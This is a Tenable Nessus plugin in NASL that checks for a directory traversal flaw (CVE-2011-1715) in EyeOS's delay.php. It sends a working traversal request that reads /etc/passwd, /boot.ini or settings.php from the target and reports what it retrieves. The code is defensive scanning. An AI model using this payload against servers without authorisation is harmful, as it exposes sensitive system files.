#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53512);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/20 13:54:16 $");

  script_cve_id("CVE-2011-1715");
  script_bugtraq_id(47184);
  script_osvdb_id(71719);
  script_xref(name:"EDB-ID", value:"17127");
  script_xref(name:"Secunia", value:"43997");

  script_name(english:"EyeOS file Parameter Directory Traversal");
  script_summary(english:"Tries to obtain a file outside the web server directory via delay.php");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a
directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of EyeOS hosted on the remote host includes a PHP script,
devtools/qooxdoo-sdk/framework/source/resource/qx/test/part/delay.php,
that fails to sanitize input to the 'file' parameter before using it
to return the contents of a file from the remote host.

An unauthenticated, remote attacker can leverage this issue to obtain
potentially sensitive information from the affected web server.

Note that this install is also likely affected by a cross-site
scripting issue, although Nessus has not checked for that
vulnerability."
  );
  # http://www.autosectools.com/Advisories/eyeOS.2.3_Local.File.Inclusion_173.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e8492f9e");
  script_set_attribute(
    attribute:"see_also",
    value:"http://blog.eyeos.org/en/2011/04/07/about-some-eyeos-security-issues/"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/04/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/04/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, embedded:0, php:TRUE);

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/boot.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/boot.ini');

# Try 'settings.php' as well; perhaps base_opendir is in effect
files = make_list(files, 'settings.php');

file_pats = make_array();
file_pats['/etc/passwd']  = "root:.*:0:[01]";
file_pats['/boot.ini']    = "^ *\[boot loader\]";
file_pats['settings.php'] = "REAL_EYE_ROOT";

# Look for installs
if (thorough_tests) dirs = list_uniq(make_list("/eyeos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents   = "";
found_file = "";
installs   = 0;
vuln_reqs  = make_list();

foreach dir (dirs)
{
  # Make sure we're dealing with eyeos
  res = http_send_recv3(
    method       : "GET",
    item         : dir+'/index.php?getApplication=register&checknum=1&args=null',
    port         : port,
    exit_on_fail : TRUE
  );

  if ("eyeos._callbackProxyWithContent" >< res[2]  && "__eyeos_specialControlMessage_header" >< res[2])
  {
    installs++;

    foreach file (files)
    {
      # Once we find a file that works, stick with it for any subsequent tests.
      if (found_file && file != found_file) continue;

      # Try to exploit the issue
      if ("settings" >< file)
        dir_traversal = mult_str(str:"../", nb:8);
      else
        dir_traversal = mult_str(str:"../", nb:12);

      exploit = "sleep=0&file=" + dir_traversal + file;

      url = dir
          + "/devtools/qooxdoo-sdk/framework/source/resource/qx/test/part/delay.php?"
          + exploit;

      res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
      body = res[2];

      # There's a problem if we see the expected contents.
      file_pat = file_pats[file];
      if (egrep(pattern:file_pat, string:body))
      {
        vuln_reqs = make_list(vuln_reqs, url);

        if (!contents && egrep(pattern:file_pat, string:body))
        {
          found_file = file;

          # Grab a more convincing chunk of the 'settings.php' code
          if ("settings" >< found_file && "REAL_EYE_ROOT" >< body)
            contents = substr(body, stridx(body, "define('REAL_EYE_ROOT',"));
          else
            contents = body;
        }
      }
    }
  }
  if (max_index(vuln_reqs) && !thorough_tests) break;
}
if (!installs) exit(0, "The web server on port "+port+" does not appear to host EyeOS.");
if (max_index(vuln_reqs) == 0) exit(0, "No vulnerable installs of EyeOS were found on the web server on port "+port+".");

# Report findings.
if (report_verbosity > 0)
{
  line_limit = 10;
  trailer = '';

  if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

  header =
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    '\'' + found_file + '\' on the remote host using the following URL';

  if (report_verbosity > 1)
  {
    trailer =
      'Here are its contents (limited to ' + line_limit + ' lines ) :\n' +
      '\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      beginning_of_response(resp:contents, max_lines:line_limit) +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
  }

  report = get_vuln_report(items:vuln_reqs, port:port, header:header, trailer:trailer);
  security_warning(port:port, extra:report);
}
else security_warning(port);
